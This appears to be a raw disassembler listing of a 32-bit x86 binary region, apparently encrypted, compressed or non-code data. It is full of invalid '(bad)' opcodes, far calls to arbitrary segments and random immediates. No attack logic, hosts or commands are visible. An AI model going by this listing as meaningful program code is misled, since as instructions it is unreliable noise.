  417a3e:	idiv   DWORD PTR [edx+0x633b9656]
  417a44:	arpl   WORD PTR [edi+0x7d],bx
  417a47:	xor    al,0xa5
  417a49:	imul   eax,DWORD PTR [esi-0x3c],0xfa10ce7d
  417a50:	dec    eax
  417a51:	cwde   
  417a52:	push   ebx
  417a53:	add    BYTE PTR [edx+eiz*1-0x6ce82822],cl
  417a5a:	std    
  417a5b:	dec    ecx
  417a5c:	fs jg  0x417a68
  417a5f:	ret    
  417a60:	xchg   edi,eax
  417a61:	pop    ecx
  417a62:	dec    ebx
  417a63:	das    
  417a64:	enter  0xa878,0x9f
  417a68:	dec    edi
  417a69:	or     BYTE PTR [ebx+0x4fffb58a],bl
  417a6f:	enter  0x6e84,0x42
  417a73:	es dec edi
  417a75:	or     DWORD PTR [edi],0x8296c472
  417a7b:	ja     0x417ac4
  417a7d:	lahf   
  417a7e:	xor    al,bh
  417a80:	pop    eax
  417a81:	test   al,0x1e
  417a83:	dec    ecx
  417a84:	push   cs
  417a85:	dec    ebp
  417a86:	shl    DWORD PTR [eax+0x6993c008],0x20
  417a8d:	aam    0x6d
  417a8f:	mov    ecx,0x0
	...
  417af4:	das    
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx+0x4fdb6086]
  417b04:	jl     0x417b00
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    al,0x1
  417b0a:	add    BYTE PTR [eax],al
  417b0c:	retf   0x3053
  417b0f:	bound  ebp,QWORD PTR ds:0xd26772ed
  417b15:	packuswb mm0,mm3
  417b18:	pop    ds
  417b19:	adc    esi,DWORD PTR [ebx+edx*2]
  417b1c:	pop    ss
  417b1d:	adc    ecx,esp
  417b1f:	jnp    0x417aff
  417b21:	xor    eax,0xa7644d9f
  417b26:	repnz pop esi
  417b28:	sbb    BYTE PTR [edx],0xc4
  417b2b:	dec    ebx
  417b2c:	daa    
  417b2d:	push   ebp
  417b2e:	mov    al,0x39
  417b30:	nop
  417b31:	imul   ecx,ecx,0x35
  417b34:	stos   BYTE PTR es:[edi],al
  417b35:	es jge 0x417b43
  417b38:	sbb    DWORD PTR [esi],esi
  417b3a:	mov    dh,0x2
  417b3c:	div    BYTE PTR [ebx]
  417b3e:	and    ebx,eax
  417b40:	lea    ebx,[edx]
  417b42:	xlat   BYTE PTR ds:[ebx]
  417b43:	cwde   
  417b44:	xor    esp,DWORD PTR [ebx+0x44]
  417b47:	retf   0xf381
  417b4a:	adc    al,0xe0
  417b4c:	out    dx,eax
  417b4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b4e:	cmp    BYTE PTR [ecx-0x2d],0x42
  417b52:	sti    
  417b53:	es jnp 0x417b3d
  417b56:	ja     0x417b93
  417b58:	mov    ds:0x9b0daf00,eax
  417b5d:	(bad)  
  417b5e:	sbb    esp,esp
  417b60:	push   edx
  417b61:	adc    ch,BYTE PTR [ecx+esi*1+0x1b]
  417b65:	mov    esi,0x912d4eeb
  417b6a:	and    ecx,ebx
  417b6c:	jbe    0x417b41
  417b6e:	add    DWORD PTR [esi-0x3a],ecx
  417b71:	pushf  
  417b72:	loopne 0x417b47
  417b74:	cmp    dl,BYTE PTR [ebx-0x1459455b]
  417b7a:	sbb    BYTE PTR [esi],dl
  417b7c:	in     eax,0x66
  417b7e:	mov    bh,0xc3
  417b80:	sbb    edi,DWORD PTR [ebx-0x64f153cc]
  417b86:	test   al,0x6b
  417b88:	icebp  
  417b89:	or     esi,DWORD PTR [edx+0x35fa953]
  417b8f:	shl    BYTE PTR [esi-0x2],0xc4
  417b93:	mov    dh,0xb8
  417b95:	mov    es:0x749b22bd,al
  417b9b:	aaa    
  417b9c:	loope  0x417b23
  417b9e:	jns    0x417bc4
  417ba0:	call   0x77309912
  417ba5:	adc    edx,0xffffff94
  417ba8:	es push es
  417baa:	pop    ss
  417bab:	fwait
  417bac:	cmc    
  417bad:	and    eax,0x2abc1db2
  417bb2:	sahf   
  417bb3:	sub    esi,esi
  417bb5:	(bad)  
  417bb6:	mov    ds:0x8f659492,eax
  417bbb:	ja     0x417beb
  417bbd:	push   ds
  417bbe:	icebp  
  417bbf:	inc    esp
  417bc0:	bound  esp,QWORD PTR [edi]
  417bc2:	dec    ebx
  417bc3:	and    dl,BYTE PTR [edi+edi*4+0x5a]
  417bc7:	int3   
  417bc8:	icebp  
  417bc9:	push   esp
  417bca:	repnz xlat BYTE PTR ds:[ebx]
  417bcc:	xchg   cx,ax
  417bce:	addr16 aam 0x1c
  417bd1:	fistp  WORD PTR [edi+0x7afa1bac]
  417bd7:	or     eax,0xa8a5420e
  417bdc:	dec    ebx
  417bdd:	fnstcw WORD PTR [ebx]
  417bdf:	jae    0x417bc9
  417be1:	addr16 pushf 
  417be3:	cmp    eax,0xd5c5f98b
  417be8:	(bad)
  417beb:	icebp  
  417bec:	call   0x35706497
  417bf1:	sub    eax,0x81e9b1d0
  417bf6:	iret   
  417bf7:	stos   DWORD PTR es:[edi],eax
  417bf8:	mul    BYTE PTR [ecx-0x1af04d0f]
  417bfe:	loope  0x417bf5
  417c00:	push   ebx
  417c01:	call   0xc4a7:0x33fb5424
  417c08:	in     al,0x6
  417c0a:	mov    ebp,0x920d9cff
	...
  417c73:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0xbf
  417c81:	sar    ecx,0xf8
  417c84:	cmp    bl,0x0
  417c87:	add    BYTE PTR [ecx+eax*1],al
  417c8a:	add    BYTE PTR [eax],al
  417c8c:	and    BYTE PTR [esi+esi*8],bl
  417c8f:	push   esp
  417c90:	mov    edi,0x3403f335
  417c95:	lods   eax,DWORD PTR ds:[esi]
  417c96:	fisttp WORD PTR [ebx]
  417c98:	fldenvw ds:0x1ec87004
  417c9f:	or     dh,BYTE PTR [ebx+0x29104e7d]
  417ca5:	adc    BYTE PTR [ebp-0x1e5203d],ch
  417cab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cac:	lods   al,BYTE PTR ds:[esi]
  417cad:	sti    
  417cae:	sbb    DWORD PTR [ebp+0x7d28d32a],edx
  417cb4:	mov    edx,0xc41fcbc4
  417cb9:	fwait
  417cba:	pop    edx
  417cbb:	(bad)  
  417cbc:	mov    eax,ds:0x6bb70447
  417cc1:	fistp  WORD PTR [ecx-0x57]
  417cc4:	data16 ja 0x417c5c
  417cc7:	mov    ecx,0x55f40764
  417ccc:	fwait
  417ccd:	clc    
  417cce:	jle    0x417c92
  417cd0:	ret    
  417cd1:	xor    edx,esi
  417cd3:	cmp    BYTE PTR [esi],dh
  417cd5:	mov    cl,0xfb
  417cd7:	rcl    DWORD PTR [ecx-0x2f],0x6b
  417cdb:	push   ss
  417cdc:	jg     0x417c82
  417cde:	xor    DWORD PTR [ebx+edx*1-0x48e04365],edi
  417ce5:	add    DWORD PTR [ecx+0xa],esi
  417ce8:	ss push ss
  417cea:	mov    esp,0xe26069be
  417cef:	aas    
  417cf0:	out    dx,al
  417cf1:	cmp    dl,bh
  417cf3:	outs   dx,BYTE PTR ds:[esi]
  417cf4:	add    eax,0xf9a505c8
  417cf9:	xchg   ebp,eax
  417cfa:	out    0x41,al
  417cfc:	sahf   
  417cfd:	out    dx,al
  417cfe:	mov    dh,bh
  417d00:	inc    ebx
  417d01:	sub    edi,ebx
  417d03:	sub    dh,cl
  417d05:	jmp    0x3ad4:0xdf4bfe84
  417d0c:	popa   
  417d0d:	mov    ds:0x58a348e9,eax
  417d12:	cmc    
  417d13:	or     BYTE PTR cs:[edx+0x7a],cl
  417d17:	stos   BYTE PTR es:[edi],al
  417d18:	jbe    0x417d7e
  417d1a:	push   edi
  417d1b:	ret    
  417d1c:	mov    esi,0xe1a7ccb3
  417d21:	mov    bl,0xbe
  417d23:	and    al,0xcb
  417d25:	not    BYTE PTR [esi+0x381d9dff]
  417d2b:	adc    eax,0x2655ac16
  417d30:	cs push esp
  417d32:	fisub  DWORD PTR [edi]
  417d34:	mov    ch,0xe6
  417d36:	aad    0x0
  417d38:	push   eax
  417d39:	mov    al,0x71
  417d3b:	lock sub cl,al
  417d3e:	xor    DWORD PTR [ecx+0x6d],edx
  417d41:	cmp    ebx,DWORD PTR [ebp+0x38ca2ff8]
  417d47:	xchg   esi,eax
  417d48:	imul   esp,DWORD PTR [esi],0xdf90828f
  417d4e:	jbe    0x417cf3
  417d50:	test   eax,0xb32c8b9f
  417d55:	mov    ah,0x9a
  417d57:	out    dx,eax
  417d58:	xor    BYTE PTR ds:0x381ad8af,dh
  417d5e:	icebp  
  417d5f:	(bad)  
  417d60:	push   ecx
  417d61:	loope  0x417cf0
  417d63:	pushf  
  417d64:	add    ebp,ebp
  417d66:	adc    BYTE PTR [ebp+ecx*1-0x54],ah
  417d6a:	scas   eax,DWORD PTR es:[edi]
  417d6b:	clc    
  417d6c:	xchg   edi,eax
  417d6d:	xchg   esp,eax
  417d6e:	mov    bl,0x81
  417d70:	retf   
  417d71:	cdq    
  417d72:	out    dx,al
  417d73:	and    eax,eax
  417d75:	xor    DWORD PTR [edx],ebx
  417d77:	lock or bl,dh
  417d7a:	fldenv [edx+esi*2-0x7a]
  417d7e:	adc    esp,DWORD PTR [esi]
  417d80:	xchg   ecx,eax
  417d81:	pop    edi
  417d82:	push   esp
  417d83:	inc    esi
  417d84:	pop    ecx
  417d85:	and    ebx,DWORD PTR [edi+edi*2+0x29695230]
  417d8c:	mov    dl,0xee
  417d8e:	aad    0x54
	...
  417df4:	pop    ss
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	sub    ecx,DWORD PTR [edx-0x37bc5a7]
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    al,0x1
  417e0a:	add    BYTE PTR [eax],al
  417e0c:	xchg   ebp,eax
  417e0d:	sbb    BYTE PTR [edx+0x52],ah
  417e10:	mov    eax,ds:0x375aae29
  417e15:	out    dx,eax
  417e16:	retf   
  417e17:	push   esp
  417e18:	mov    WORD PTR ds:0x38c98bfc,gs
  417e1e:	jmp    0xb60e8a5f
  417e23:	addr16 push ds
  417e25:	or     eax,0xe7cf5fe1
  417e2a:	je     0x417e30
  417e2c:	push   edx
  417e2d:	xor    DWORD PTR [esi+0x7b],ecx
  417e30:	fild   WORD PTR [ebx+eax*1-0x2f]
  417e34:	das    
  417e35:	cs pop eax
  417e37:	or     BYTE PTR [eax],cl
  417e39:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  417e3b:	sub    al,BYTE PTR [eax+0x40]
  417e3e:	jb     0x417e7d
  417e40:	pop    ebp
  417e41:	clc    
  417e42:	cmp    BYTE PTR es:[ecx-0x40a0eabc],cl
  417e49:	mov    eax,0xd54fcb46
  417e4e:	pop    ecx
  417e50:	cmp    al,0x50
  417e52:	addr16 (bad) 
  417e54:	out    dx,al
  417e55:	adc    ah,dl
  417e57:	or     cl,BYTE PTR [esi-0x25750c3d]
  417e5d:	sbb    eax,0x2cdca295
  417e62:	daa    
  417e63:	fisttp DWORD PTR [eax-0x39ec3c04]
  417e69:	adc    al,0x40
  417e6b:	cmp    eax,0xbb762dbe
  417e70:	xchg   ebx,eax
  417e71:	pop    esp
  417e72:	mov    ecx,0x6bc37a71
  417e77:	mov    ds:0xb1ff66a6,al
  417e7c:	cli    
  417e7d:	stos   BYTE PTR es:[edi],al
  417e7e:	xor    DWORD PTR [ebx-0x77],ebp
  417e81:	jne    0x417eab
  417e83:	dec    ebp
  417e84:	jmp    0xbb81f9d7
  417e89:	add    edx,edi
  417e8b:	inc    eax
  417e8c:	jno    0x417e4c
  417e8e:	lods   eax,DWORD PTR ds:[esi]
  417e90:	inc    ecx
  417e91:	out    0x21,al
  417e93:	or     eax,0xb0db0713
  417e98:	jmp    0x417e33
  417e9a:	adc    al,0xc7
  417e9c:	xor    ah,bl
  417e9e:	sub    esi,edi
  417ea0:	mov    ecx,0x8853b285
  417ea5:	inc    edi
  417ea6:	push   eax
  417ea7:	and    ch,BYTE PTR [edx]
  417ea9:	xor    ch,BYTE PTR [ebx-0x37]
  417eac:	mov    al,ds:0x40b23a9
  417eb1:	retf   
  417eb2:	pop    edi
  417eb3:	mov    cl,0x44
  417eb5:	pop    es
  417eb6:	jae    0x417ed2
  417eb8:	xor    al,0x90
  417eba:	fwait
  417ebb:	mov    esi,ecx
  417ebd:	add    bl,bl
  417ebf:	mov    ah,0x35
  417ec1:	popa   
  417ec2:	jbe    0x417e8f
  417ec4:	push   eax
  417ec5:	xor    dl,BYTE PTR ds:0x961944b6
  417ecb:	add    al,0xea
  417ecd:	loop   0x417efa
  417ecf:	les    ebp,FWORD PTR [esi]
  417ed1:	adc    al,0xec
  417ed3:	inc    esi
  417ed4:	pop    es
  417ed5:	inc    esi
  417ed6:	mov    fs,edx
  417ed8:	loop   0x417e99
  417eda:	in     al,dx
  417edb:	add    eax,0x2d13ad79
  417ee0:	stos   DWORD PTR es:[edi],eax
  417ee1:	inc    esp
  417ee2:	and    ecx,edx
  417ee4:	std    
  417ee5:	pop    es
  417ee6:	sub    BYTE PTR [ebp-0x37],dh
  417ee9:	ror    BYTE PTR [ebx-0x5c],cl
  417eec:	outs   dx,DWORD PTR ds:[esi]
  417eed:	inc    ebx
  417eee:	(bad)  
  417ef0:	fsub   st(4),st
  417ef2:	xchg   edi,eax
  417ef3:	mov    ebp,0xa20c85aa
  417ef8:	call   FWORD PTR [eax-0x2644f802]
  417efe:	dec    edi
  417eff:	push   ebx
  417f00:	push   ebp
  417f01:	sti    
  417f02:	je     0x417f06
  417f04:	dec    esi
  417f05:	pop    ecx
  417f06:	xchg   edx,eax
  417f07:	hlt    
  417f08:	jne    0x417f24
  417f0a:	and    cl,BYTE PTR [edi+0x95e149]
	...
  417f74:	(bad)  
  417f75:	out    0xe6,al
  417f77:	cmp    esp,esi
  417f79:	cmp    edi,edi
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	sub    bl,BYTE PTR cs:[ecx]
  417f83:	add    eax,0xfd88
  417f88:	add    al,0x1
  417f8a:	add    BYTE PTR [eax],al
  417f8c:	jge    0x417fc2
  417f8e:	dec    edx
  417f8f:	xchg   esp,eax
  417f90:	pop    edi
  417f91:	js     0x417f7c
  417f93:	jb     0x417f58
  417f95:	mov    cl,0xcf
  417f97:	and    BYTE PTR [ebx-0x282b2054],ch
  417f9d:	aam    0xcd
  417f9f:	dec    esp
  417fa0:	mov    al,ah
  417fa2:	pop    esi
  417fa3:	aas    
  417fa4:	call   0xa5e3:0x78aebf54
  417fab:	pop    ss
  417fac:	iret   
  417fad:	mov    edx,0xb5836ff5
  417fb2:	sti    
  417fb3:	cmp    eax,0x1afd125c
  417fb8:	mov    eax,ds:0x7598138
  417fbd:	(bad)  
  417fbe:	mov    edx,0x46692195
  417fc3:	and    al,0x4d
  417fc5:	and    ah,dh
  417fc7:	test   DWORD PTR [esi-0x66e22622],edx
  417fcd:	add    DWORD PTR [edx-0x2331a734],0xa93f479a
  417fd7:	inc    ebx
  417fd8:	mov    esi,0x757163f8
  417fdd:	push   es
  417fde:	jb     0x417f97
  417fe0:	adc    eax,0x33bcad1e
  417fe5:	fild   QWORD PTR [ebx]
  417fe7:	pop    ebp
  417fe8:	inc    esi
  417fe9:	pop    esi
  417fea:	imul   esi,ecx,0xffffffcc
  417fed:	add    esi,esi
  417fef:	push   ecx
  417ff0:	arpl   WORD PTR [edi],ax
  417ff2:	jbe    0x418057
  417ff4:	adc    al,0x21
  417ff6:	inc    ecx
  417ff7:	fidivr WORD PTR [edi]
  417ff9:	push   cs
  417ffa:	ror    esp,cl
  417ffc:	push   ebx
  417ffd:	xchg   ebp,eax
  417ffe:	fsub   QWORD PTR [edx+ecx*4]
  418001:	adc    DWORD PTR [ebp+0x17],ecx
  418004:	and    DWORD PTR [eax+0x63],ebp
  418007:	mov    al,0x64
  418009:	aad    0x49
  41800b:	int    0x7c
  41800d:	adc    eax,0x8efa7af4
  418012:	dec    ebp
  418013:	push   0x5a1549e7
  418018:	mov    dh,0xdd
  41801a:	retf   
  41801b:	add    eax,0x3e670809
  418020:	push   cs
  418021:	mov    bl,0xe7
  418023:	add    al,0xa4
  418025:	xor    BYTE PTR [edi+0x263eb008],bh
  41802b:	xchg   edi,eax
  41802c:	cwde   
  41802d:	mov    dl,0x4f
  41802f:	xchg   BYTE PTR [ebx+0x9364b90],cl
  418035:	xchg   ebx,eax
  418036:	cmp    eax,DWORD PTR [esi+0x72935860]
  41803c:	cmc    
  41803d:	and    eax,0xe925295b
  418043:	in     al,dx
  418044:	je     0x417ff9
  418046:	inc    esi
  418047:	lea    ebx,[esi]
  418049:	ror    dl,0xe5
  41804c:	xchg   edx,eax
  41804d:	in     eax,dx
  41804e:	das    
  41804f:	mov    ds:0x5915fb11,eax
  418054:	fucomi st,st(7)
  418056:	enter  0x6bb6,0x73
  41805a:	and    al,0x64
  41805c:	bound  ebp,QWORD PTR [edi]
  41805e:	mov    eax,ds:0x2578443e
  418063:	mov    cs,ebp
  418065:	add    dh,bl
  418067:	sbb    eax,0xf4304cc0
  41806c:	in     al,dx
  41806d:	xchg   edi,eax
  41806e:	mov    dl,0x77
  418070:	dec    ecx
  418071:	push   esp
  418072:	or     eax,0xad41a185
  418077:	shr    DWORD PTR [ebx],0xce
  41807a:	lds    ebp,FWORD PTR [edi+0x48da81a2]
  418080:	fnstenv [ebx-0xf5c0d56]
  418086:	repnz int3 
  418088:	push   esi
  418089:	test   eax,0xdaf22ccd
  41808e:	and    DWORD PTR [edi+0x0],ebx
	...
  4180f1:	add    BYTE PTR [eax],al
  4180f3:	add    BYTE PTR [ecx-0xba9482],ch
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x902fdebc,eax
  418101:	addr16 cs cld 
  418104:	mov    esi,?
  418106:	add    BYTE PTR [eax],al
  418108:	add    al,0x1
  41810a:	add    BYTE PTR [eax],al
  41810c:	jo     0x418119
  41810e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41810f:	call   0xb958:0xc2ccf498
  418116:	std    
  418117:	sbb    ebx,DWORD PTR cs:[esp+edx*1+0x3a]
  41811c:	xchg   ebx,eax
  41811d:	aaa    
  41811e:	ins    BYTE PTR es:[edi],dx
  41811f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418120:	aaa    
  418121:	dec    ebx
  418122:	jmp    0xad327949
  418127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418128:	fisubr WORD PTR [esi+0x3d]
  41812b:	out    dx,eax
  41812c:	scas   al,BYTE PTR es:[edi]
  41812d:	adc    DWORD PTR [ebx],0x5d646638
  418133:	mov    eax,0xcf9226fa
  418138:	add    edi,DWORD PTR [edi]
  41813a:	sbb    eax,0x9ebb4ed6
  41813f:	xor    BYTE PTR [edi-0x15],dh
  418142:	test   eax,0x3fefe2a1
  418147:	dec    edi
  418148:	jg     0x418114
  41814a:	sar    DWORD PTR [ebx],1
  41814c:	stc    
  41814d:	sahf   
  41814e:	or     eax,0x42dd2ecc
  418153:	jns    0x418133
  418155:	leave  
  418156:	jle    0x418191
  418158:	adc    DWORD PTR [edi],eax
  41815a:	loopne 0x4180f1
  41815c:	and    eax,DWORD PTR [esi+eax*4-0x5beb3f74]
  418163:	out    dx,al
  418164:	mov    edi,0x1e1ff6c0
  418169:	push   cs
  41816a:	xchg   ebp,eax
  41816b:	dec    ebx
  41816c:	fsub   QWORD PTR [eax]
  41816e:	or     al,dh
  418170:	out    dx,eax
  418171:	push   esp
  418172:	sti    
  418173:	fldcw  WORD PTR [ecx-0x6b]
  418176:	enter  0x8181,0xa6
  41817a:	and    al,0x2d
  41817c:	xor    eax,0xccebc4c
  418181:	inc    ecx
  418182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418183:	pushf  
  418184:	cs dec esi
  418186:	mov    ds:0x65073f7c,eax
  41818b:	mov    ebx,0x4692d8ee
  418190:	push   edx
  418191:	cmp    DWORD PTR [esi+0x67abdcdc],0x499c2d0
  41819b:	int3   
  41819c:	shl    BYTE PTR [edx-0x3fe22d49],1
  4181a2:	pusha  
  4181a3:	fild   WORD PTR [edx]
  4181a5:	pop    ecx
  4181a6:	fs call 0x2a15:0x81146d0a
  4181ae:	mov    ds:0x4f08ebdf,al
  4181b3:	bound  edx,QWORD PTR [edi-0x3a420170]
  4181b9:	fwait
  4181ba:	cmp    ebx,eax
  4181bc:	dec    ecx
  4181bd:	icebp  
  4181be:	stos   DWORD PTR es:[edi],eax
  4181bf:	jl     0x41822c
  4181c1:	mov    ds:0xe27f929a,eax
  4181c6:	xor    DWORD PTR [ebx],0x4f413076
  4181cc:	pop    edi
  4181cd:	ror    BYTE PTR [esi],cl
  4181cf:	and    al,0x59
  4181d1:	fyl2x  
  4181d3:	dec    ecx
  4181d4:	scas   eax,DWORD PTR es:[edi]
  4181d5:	mov    edi,es
  4181d7:	xchg   ebp,edi
  4181d9:	sbb    DWORD PTR [ebp-0x17afa009],esp
  4181df:	sar    edx,cl
  4181e1:	cmp    al,0xd6
  4181e3:	xor    eax,0xbc1916c5
  4181e8:	push   ebx
  4181e9:	pop    edx
  4181ea:	mov    ds:0xea445576,eax
  4181ef:	cmp    al,0x45
  4181f1:	add    al,0x35
  4181f3:	pop    edx
  4181f4:	cmp    ecx,DWORD PTR [esi]
  4181f6:	(bad)  
  4181f7:	cmp    ah,al
  4181f9:	std    
  4181fa:	jns    0x4181f7
  4181fc:	and    BYTE PTR [eax+0x5],0x7d
  418200:	mov    ch,0x53
  418202:	ins    DWORD PTR es:[edi],dx
  418203:	pop    ebx
  418204:	daa    
  418205:	ret    
  418206:	xchg   esp,eax
  418207:	aad    0xfa
  418209:	js     0x41821d
  41820b:	or     DWORD PTR [eax+0x538529],0x0
	...
  418271:	add    BYTE PTR [eax],al
  418273:	add    BYTE PTR [edi],dh
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0x9269b8d6
  418282:	mov    cl,0xa
  418284:	nop
  418285:	inc    DWORD PTR [eax]
  418287:	add    BYTE PTR [ecx+eax*1],al
  41828a:	add    BYTE PTR [eax],al
  41828c:	loope  0x41820e
  41828e:	retf   
  41828f:	mov    bl,BYTE PTR [esi+0x3f]
  418292:	ror    cl,1
  418294:	pop    ebx
  418295:	sbb    eax,0x65ceed41
  41829a:	imul   edx,edi,0x1be5ed1c
  4182a0:	jecxz  0x41825f
  4182a2:	xchg   esp,eax
  4182a3:	sub    ebx,DWORD PTR [eax+0x74f1d80]
  4182a9:	jnp    0x418261
  4182ab:	push   0x63402880
  4182b0:	mov    ecx,0x778e9224
  4182b5:	dec    esp
  4182b6:	ret    0x7e2d
  4182b9:	repnz pop ebp
  4182bb:	jnp    0x418264
  4182bd:	(bad)  
  4182be:	inc    BYTE PTR [eax+0x7d]
  4182c1:	cvtps2pi mm6,QWORD PTR [ebx+0x1553380d]
  4182c8:	hlt    
  4182c9:	pop    ss
  4182ca:	or     esp,ebx
  4182cc:	xor    eax,0x8524cda9
  4182d1:	scas   al,BYTE PTR es:[edi]
  4182d2:	sahf   
  4182d3:	xchg   edx,eax
  4182d4:	add    al,0xe0
  4182d6:	fistp  QWORD PTR [edi-0x7e7bed0a]
  4182dc:	jb     0x4182b6
  4182de:	inc    ebp
  4182df:	popa   
  4182e0:	pop    esi
  4182e1:	pop    esp
  4182e2:	aam    0xfd
  4182e4:	jecxz  0x4182bf
  4182e6:	jmp    0x41829b
  4182e8:	mov    ch,0x28
  4182ea:	pop    esp
  4182eb:	push   0x5b
  4182ed:	cmp    edx,ebx
  4182ef:	outs   dx,DWORD PTR ds:[esi]
  4182f0:	ss cwde 
  4182f2:	mov    bh,0x8a
  4182f4:	fstp   QWORD PTR [ebp-0x67]
  4182f7:	out    0xc9,eax
  4182f9:	jmp    0x4182a9
  4182fb:	push   ebx
  4182fc:	cmp    ebx,DWORD PTR [eax]
  4182fe:	inc    ebp
  4182ff:	pop    esi
  418300:	cld    
  418301:	xor    ch,BYTE PTR [eax]
  418303:	xor    eax,0xfaa43272
  418308:	mov    esp,0x4bcd85d1
  41830d:	and    al,0x4c
  41830f:	push   cs
  418310:	retf   0xf2d5
  418313:	dec    esi
  418314:	mov    ds:0x9fb6dd8b,al
  418319:	lods   eax,DWORD PTR ds:[esi]
  41831a:	add    al,0x27
  41831c:	xor    bl,al
  41831e:	iret   
  41831f:	fwait
  418320:	in     al,0x58
  418322:	out    0x9a,eax
  418324:	stc    
  418325:	fisub  DWORD PTR [ebp+0x235d9d65]
  41832b:	popa   
  41832c:	pop    ss
  41832d:	xor    BYTE PTR [ebx-0x6b17b072],dh
  418333:	pop    edi
  418334:	or     eax,0x74dd03b6
  418339:	mov    ebp,0xd6ecdc82
  41833e:	and    BYTE PTR [edx-0x2dfaa39b],bl
  418344:	test   eax,0x712b067e
  418349:	loopne 0x418331
  41834b:	push   cs
  41834c:	mov    eax,eax
  41834e:	out    dx,al
  41834f:	rol    DWORD PTR [esp+eax*1-0x3f],cl
  418353:	and    DWORD PTR [edx+0x5f],esi
  418356:	(bad)  [edi]
  418358:	(bad)  
  418359:	lock inc esi
  41835b:	xor    ecx,DWORD PTR [ebx+edi*8-0x55]
  41835f:	fdivr  st(4),st
  418361:	jecxz  0x41832d
  418363:	xlat   BYTE PTR ds:[ebx]
  418364:	out    dx,eax
  418365:	pop    esp
  418366:	rol    bh,0x26
  418369:	adc    BYTE PTR [ebp+edx*2-0x4feef737],cl
  418370:	mov    esi,0x791785e5
  418375:	and    eax,0x87ac7514
  41837a:	mov    ds:0x31733e5c,al
  41837f:	xchg   ebp,eax
  418380:	add    DWORD PTR [ecx],0xffffffaa
  418383:	out    0x7f,al
  418385:	rol    ebx,1
  418387:	push   ecx
  418388:	inc    edx
  418389:	xor    ch,ah
  41838b:	in     al,dx
  41838c:	add    al,0x87
  41838e:	(bad)  
  41838f:	adc    eax,0x0
	...
  4183f4:	fdiv   QWORD PTR [ebx-0x2380afc1]
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	scas   al,BYTE PTR es:[edi]
  418401:	lods   al,BYTE PTR ds:[esi]
  418402:	retf   0x94b2
  418405:	add    BYTE PTR [ecx],al
  418407:	add    BYTE PTR [ecx+eax*1],al
  41840a:	add    BYTE PTR [eax],al
  41840c:	(bad)  
  41840d:	push   edx
  41840e:	mov    DWORD PTR [esi-0x6c],esp
  418411:	loope  0x41841a
  418413:	hlt    
  418414:	mov    fs,WORD PTR [ecx-0x66c5825f]
  41841a:	push   ecx
  41841b:	jbe    0x418413
  41841d:	mov    eax,ds:0xb8b7fd3c
  418422:	outs   dx,BYTE PTR ds:[esi]
  418423:	call   0x290a90bf
  418428:	or     BYTE PTR [esi],bh
  41842a:	xchg   edi,eax
  41842b:	lahf   
  41842c:	pop    ds
  41842d:	xchg   edx,eax
  41842e:	lea    eax,[edx]
  418430:	mov    bh,0xb0
  418432:	xor    ebp,ecx
  418434:	sub    al,0xf9
  418436:	pop    es
  418437:	sub    BYTE PTR [esi+0x41],bh
  41843a:	retf   0xf710
  41843d:	or     eax,0x6cb98e05
  418442:	lods   eax,DWORD PTR ds:[esi]
  418443:	mov    edi,0x4008c963
  418448:	dec    eax
  418449:	xchg   esp,eax
  41844a:	pop    ss
  41844b:	ja     0x418478
  41844d:	imul   ebp,DWORD PTR [edx-0x6],0x5f5fd9c4
  418454:	ins    BYTE PTR es:[edi],dx
  418455:	repnz xor eax,0xfc45fb15
  41845b:	test   al,0xc7
  41845d:	and    DWORD PTR [edx+eax*1+0x12],ecx
  418461:	jmp    0x578b9483
  418466:	jb     0x4184b7
  418468:	dec    ebx
  418469:	leave  
  41846a:	sub    al,0x0
  41846c:	mov    al,bh
  41846e:	jo     0x4184ea
  418470:	sub    edx,edx
  418472:	push   0x17
  418474:	xchg   ebx,eax
  418475:	(bad)  
  418476:	cmp    dl,BYTE PTR [ebp+0x42]
  418479:	sahf   
  41847a:	dec    eax
  41847b:	and    dh,al
  41847d:	pop    es
  41847e:	jns    0x41840f
  418480:	add    eax,DWORD PTR [ebp-0x2f478ed9]
  418486:	test   eax,0x5e190fd0
  41848b:	dec    edx
  41848c:	and    ebp,DWORD PTR [esi]
  41848e:	push   0x3b
  418490:	push   edx
  418491:	iret   
  418492:	xchg   ebx,eax
  418493:	ret    
  418494:	mov    ecx,0x1c4d9462
  418499:	dec    ebp
  41849a:	lahf   
  41849b:	mov    ebx,0xb50b27cc
  4184a0:	mov    cl,0x69
  4184a2:	adc    BYTE PTR [ebx+0x54],0x8d
  4184a6:	mov    eax,ds:0xf7a1eb5
  4184ab:	mov    eax,0xb4393b8b
  4184b0:	pop    edi
  4184b1:	mov    esp,0xf3203798
  4184b6:	and    BYTE PTR [edx],bl
  4184b8:	xor    edi,DWORD PTR [eax+0x4a05610b]
  4184be:	sub    al,0xeb
  4184c0:	mov    BYTE PTR [edx],bl
  4184c2:	xchg   DWORD PTR [esi-0x13],ebx
  4184c5:	imul   BYTE PTR ds:0x286edc29
  4184cb:	mov    ebx,0xd5896072
  4184d0:	sub    al,0xe4
  4184d2:	xchg   esi,eax
  4184d3:	or     cl,al
